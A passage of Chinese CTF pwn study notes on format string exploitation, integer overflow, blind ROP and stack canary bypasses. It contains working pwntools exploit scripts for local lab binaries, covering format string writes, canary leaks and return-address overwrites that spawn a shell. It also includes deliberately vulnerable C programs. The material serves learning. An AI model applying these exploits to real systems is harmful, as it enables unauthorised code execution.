class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于覆盖偏移的话可以通过测试得出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</span><br></pre></td></tr></table></figure><p>可以得到，是格式化字符串的第 6 个参数</p><p><img src="/2024/03/15/CTF/image-20240417003252995.png" alt="image-20240417003252995"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"><span class="comment"># 地址要以10进制的格式传入，在栈上自动转为16进制</span></span><br><span class="line">c_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_addr: &quot;</span>, <span class="built_in">hex</span>(c_addr))</span><br><span class="line"><span class="comment"># 要使c=16,我们要写入16个字节的内容,%n计算已经写入的长度</span></span><br><span class="line"><span class="comment"># 这里p32()是4字节，12个a然后&#x27;%6$n&#x27;代表，向第6个参数写入长度</span></span><br><span class="line">payload = p32(c_addr) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>由上面知道我们最少也要输入一个内存地址，所以覆盖的最小值为4，我们如何覆盖比4还小的数呢。</p><p><code>aa%k$nxx</code>，如果用这样的方式，前面 <code>aa%k</code> (4个字节)是第六个参数，<code>$nxx</code> （4个字节）是第七个参数，后面在跟一个 我们想要修改的地址，那么这个地址就是第八个参数，只需要把 k 改成 8 就可以把这第八个参数改成 2，<code>aa%8$nxx</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"></span><br><span class="line">a_addr = <span class="number">0x804C018</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/03/15/CTF/image-20240417010211247.png" alt="image-20240417010211247"></p><h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数</span><br><span class="line">hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</span><br></pre></td></tr></table></figure><p>意思是说：hhn 写入的就是单字节，hn 写入的就是双字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">program = <span class="string">&quot;./overwrite&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(program)</span><br><span class="line"></span><br><span class="line">b_addr = <span class="number">0x804C01C</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向四个地址写入长度，但是每个地址只写一个字节</span></span><br><span class="line">payload = p32(b_addr) + p32(b_addr + <span class="number">1</span>) + p32(b_addr + <span class="number">2</span>) + p32(b_addr + <span class="number">3</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%104x&#x27;</span> + <span class="string">b&#x27;%6$hhn&#x27;</span> + <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%7$hhn&#x27;</span>+ <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%8$hhn&#x27;</span>+ <span class="string">b&#x27;%222x&#x27;</span> + <span class="string">b&#x27;%9$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(fmtstr_payload(6, &#123;0x804C01C:0x12345678&#125;))</span></span><br><span class="line"><span class="comment"># pwntools带着一个函数,很方便</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">output = p.recv()</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>前面的那一串 p32()，每算是 4 字符，这样到 %6$hhn 前面就是：16+104&#x3D;120，也就是 0x78</p><p>再加上 222 就是 342，也就是 0x156，然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678</p><p><img src="/2024/03/15/CTF/image-20240417134526355.png" alt="image-20240417134526355"></p><h3 id="x64格式化字符串"><a href="#x64格式化字符串" class="headerlink" title="x64格式化字符串"></a>x64格式化字符串</h3><p>在 Linux 上，前六个参数通过 <code>RDI</code>、<code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code> 传递；而在 Windows 中，前四个参数通过 <code>RCX</code>、<code>RDX</code>、<code>R8</code> 和 <code>R9</code> 来传递。</p><p>我们最后的输出中，前五个数字分别来自寄存器 <code>RSI</code>、<code>RDX</code>、<code>RCX</code>、<code>R8</code> 和 <code>R9</code>，后面的数字才取自栈，<code>0x4141414141414141</code> 在 <code>%8$p</code> 的位置。这里还有个地方要注意，我们前面说的 Linux 有 6 个寄存器用于传递参数，可是这里只输出了 5 个，原因是有一个寄存器 <code>RDI</code> 被用于传递格式字符串，可以从 gdb 中看到，<code>arg[0]</code> 就是由 <code>RDI</code> 传递的格式字符串。（现在你可以再回到 x86 的相关内容，可以看到在 x86 中格式字符串通过栈传递的，但是同样的也不会被打印出来）其他的操作和 x86 没有什么大的区别，只是这时我们就不能修改 <code>arg2</code> 的值了，因为它被存入了寄存器中。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>[<a href="https://www.nssctf.cn/problem/2599">HUBUCTF 2022 新生赛]fmt | NSSCTF</a></p><p><img src="/2024/03/15/CTF/image-20240426213558131.png" alt="image-20240426213558131"></p><p>可以利用格式化字符串漏洞</p><p>使用gdb调试，输入<code>aaaaaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code><img src="/2024/03/15/CTF/image-20240426213727735.png" alt="image-20240426213727735"></p><p>发现输入位置在第8个</p><p>ida查看得知<img src="/2024/03/15/CTF/image-20240426213850847.png" alt="image-20240426213850847"></p><p>我们输入的位置在format上，而flag的内容在s上，两者相隔0x20，</p><p>所以flag的位置在<code>(0x60 - 0x40) / 8 + 8</code>，是在第12个</p><h3 id="pwntools-pwnlib-fmtstr-模块"><a href="#pwntools-pwnlib-fmtstr-模块" class="headerlink" title="pwntools pwnlib.fmtstr 模块"></a>pwntools pwnlib.fmtstr 模块</h3><p><code>FmtStr</code> 提供了自动化的字符串漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</span><br></pre></td></tr></table></figure><ul><li>execute_fmt (function)：与漏洞进程进行交互的函数</li><li>offset (int)：你控制的第一个格式化程序的偏移量</li><li>padlen (int)：在 paylod 之前添加的 pad 的大小</li><li>numbwritten (int)：已经写入的字节数</li></ul><p><code>fmtstr_payload</code> 用于自动生成格式化字符串 paylod：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br></pre></td></tr></table></figure><ul><li>offset (int)：你控制的第一个格式化程序的偏移量</li><li>writes (dict)：格式为 {addr: value, addr2: value2}，用于往 addr 里写入 value 的值（常用：{printf_got}）</li><li>numbwritten (int)：已经由 printf 函数写入的字节数</li><li>write_size (str)：必须是 byte，short 或 int。告诉你是要逐 byte 写，逐 short 写还是逐 int 写（hhn，hn或n）</li></ul><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>关于整数的异常情况主要有三种：</p><ul><li>溢出<ul><li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li><li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li><li>进位标志 <code>CF</code> 可检测无符号数的回绕</li></ul></li><li>截断<ul><li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li></ul></li></ul><h3 id="有符号整数溢出"><a href="#有符号整数溢出" class="headerlink" title="有符号整数溢出"></a>有符号整数溢出</h3><ul><li>上溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">i = INT_MAX;  // 2 147 483 647</span><br><span class="line">i++;</span><br><span class="line">printf(&quot;i = %d\n&quot;, i);  // i = -2 147 483 648</span><br></pre></td></tr></table></figure><ul><li>下溢出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = INT_MIN;  // -2 147 483 648</span><br><span class="line">i--;</span><br><span class="line">printf(&quot;i = %d\n&quot;, i);  // i = 2 147 483 647</span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">validate_passwd</span><span class="params">(<span class="type">char</span> *passwd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> passwd_buf[<span class="number">11</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> passwd_len = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">    <span class="keyword">if</span>(passwd_len &gt;= <span class="number">4</span> &amp;&amp; passwd_len &lt;= <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(passwd_buf, passwd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bad!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    validate_passwd(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack vuln.c</span><br></pre></td></tr></table></figure><h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><p><a href="https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.1_pwn_hctf2016_brop">6.1.1 pwn HCTF2016 brop | CTF-All-In-One (gitbook.io)</a></p><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>出题人在 github 上开源了代码，<a href="https://github.com/zh-explorer/hctf2016-brop">出题人失踪了</a>。如下：</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int i;</span><br><span class="line">int check();</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line"></span><br><span class="line">    puts(&quot;WelCome my friend,Do you know password?&quot;);</span><br><span class="line">        if(!check()) &#123;</span><br><span class="line">            puts(&quot;Do not dump my memory&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            puts(&quot;No password, no game&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int check() &#123;</span><br><span class="line">    char buf[50];</span><br><span class="line">    read(STDIN_FILENO, buf, 1024);</span><br><span class="line">    return strcmp(buf, &quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用下面的语句编译，然后运行起来：</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -z noexecstack -fno-stack-protector -no-pie brop.c</span><br></pre></td></tr></table></figure><p>checksec 如下：</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ checksec -f a.out</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               2       a.out</span><br></pre></td></tr></table></figure><p>由于 socat 在程序崩溃时会断开连接，我们写一个小脚本，让程序在崩溃后立即重启，这样就模拟出了远程环境 <code>127.0.0.1:10001</code>：</p><p>Copy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">while true; do</span><br><span class="line">        num=`ps -ef | grep &quot;socat&quot; | grep -v &quot;grep&quot; | wc -l`</span><br><span class="line">        if [ $num -lt 5 ]; then</span><br><span class="line">                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out &amp;</span><br><span class="line">        fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>在一个单独的 shell 中运行它，这样我们就简单模拟出了比赛时的环境，即仅提供 ip 和端口。（不停地断开重连特别耗CPU，建议在服务器上跑）</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的 64-bit Linux。</p><p>实现这一攻击有两个必要条件：</p><ol><li>目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它</li><li>目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。</li></ol><p>下面我们结合题目来讲一讲。</p><h4 id="找到栈溢出漏洞"><a href="#找到栈溢出漏洞" class="headerlink" title="找到栈溢出漏洞"></a>找到栈溢出漏洞</h4><p>首先是要找到栈溢出的漏洞，老办法从 1 个字符开始，暴力枚举，直到它崩溃。</p><h4 id="stop-gadget"><a href="#stop-gadget" class="headerlink" title="stop gadget"></a>stop gadget</h4><p>在寻找通用 gadget 之前，我们需要一个 stop gadget。一般情况下，当我们把返回地址覆盖后，程序有很大的几率会挂掉，因为所覆盖的地址可能并不是合法的，所以我们需要一个能够使程序正常返回的地址，称作 stop gadget，这一步至关重要。stop gadget 可能不止一个，这里我们之间返回找到的第一个好了：</p><h2 id="canary绕过"><a href="#canary绕过" class="headerlink" title="canary绕过"></a>canary绕过</h2><p><a href="https://blog.csdn.net/Morphy_Amo/article/details/122120696">【pwn学习】Canary的各种绕过姿势_pwn canary绕过-CSDN博客</a></p><p>下面的<code>exp.py</code>都是用上面文章中的例子</p><h3 id="方法一-覆盖截断字符获取Canary"><a href="#方法一-覆盖截断字符获取Canary" class="headerlink" title="方法一 覆盖截断字符获取Canary"></a>方法一 覆盖截断字符获取Canary</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>Canary设计其低字节为\x00，本意是阻止被read、write等函数直接将Canary读出来。通过栈溢出将低位的\x00覆写，就可以读出Canary的值。</p><p>从上面的分析，我们可以梳理出绕过的思路：</p><p>构造第一次溢出，覆写Canary低字节\x00，读取出Canary值<br>构造第二次溢出，利用获取的Canary重新构造payload，获取shell。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];<span class="comment">// 栈溢出位置</span></span><br><span class="line">    <span class="comment">// 向buf中填入两次，因此第一次泄露canary，第二次getshell</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/15/CTF/image-20240412155534384.png" alt="image-20240412155534384"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由图可知，buf的位置是-0x70，var_C（canary）的位置是-0xc</span><br><span class="line">算出相对位置，通过printf函数泄露canary的值。具体见代码</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>)</span><br><span class="line"><span class="comment"># sendline函数会在最后加上个一个换行符,正好替换掉了&#x27;\x00‘</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>))</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># 减去回车0x0a</span></span><br><span class="line">canary -= <span class="number">0x0a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Canary: &quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment"># 填充了0x70 + 4个字符后面正好接system函数</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法二-利用格式化字符串漏洞获取Canary"><a href="#方法二-利用格式化字符串漏洞获取Canary" class="headerlink" title="方法二 利用格式化字符串漏洞获取Canary"></a>方法二 利用格式化字符串漏洞获取Canary</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，从而进行栈溢出。</p><p><strong>如何确定canary的位置呢？</strong></p><ol><li><p>首先确认当前输入的文本在栈中的位置.</p><p>构造payload等于<code>aaaa</code>+n个<code>%x-</code>，然后观察输出，直到输出中包含<code>61616161</code>，即4个<code>a</code>的ascii码。如下所示：</p><p><img src="/2024/03/15/CTF/image-20240412204436854.png" alt="image-20240412204436854"></p><p>数出61616161出现的位置，这里出现在栈中第6个位置，对应第6个<code>%x</code></p></li><li><p>从上一题我们知道从栈顶到canary的距离是<code>0x70-0xc</code>，而printf中的一个<code>%x</code>会输出4个字节，因此间隔了<code>(0x70-0xC)/4=25</code>个<code>%x</code>，因此从第6个<code>%x</code>开始，再输出25个<code>%x</code>就是canary的值</p></li></ol><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用格式化字符串漏洞获取Canary</span></span><br><span class="line">payload1 = <span class="string">b&#x27;%x-&#x27;</span> * (<span class="number">6</span> + <span class="number">25</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recvbytes = p.recv()</span><br><span class="line"><span class="comment"># print(recvbytes)</span></span><br><span class="line"><span class="comment"># print(type(recvbytes.split(b&#x27;-&#x27;)[-2]))</span></span><br><span class="line"><span class="comment"># 这里不能使用u32()的原因：可能是因为得到的元素是一个bytes类型</span></span><br><span class="line">canary = <span class="built_in">int</span>(recvbytes.split(<span class="string">b&#x27;-&#x27;</span>)[-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Canary: &quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="方法三-逐字节爆破"><a href="#方法三-逐字节爆破" class="headerlink" title="方法三 逐字节爆破"></a>方法三 逐字节爆破</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>每次进程重启后的Canary是不同的，但是同一个进程中的Canary都是一样的。并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 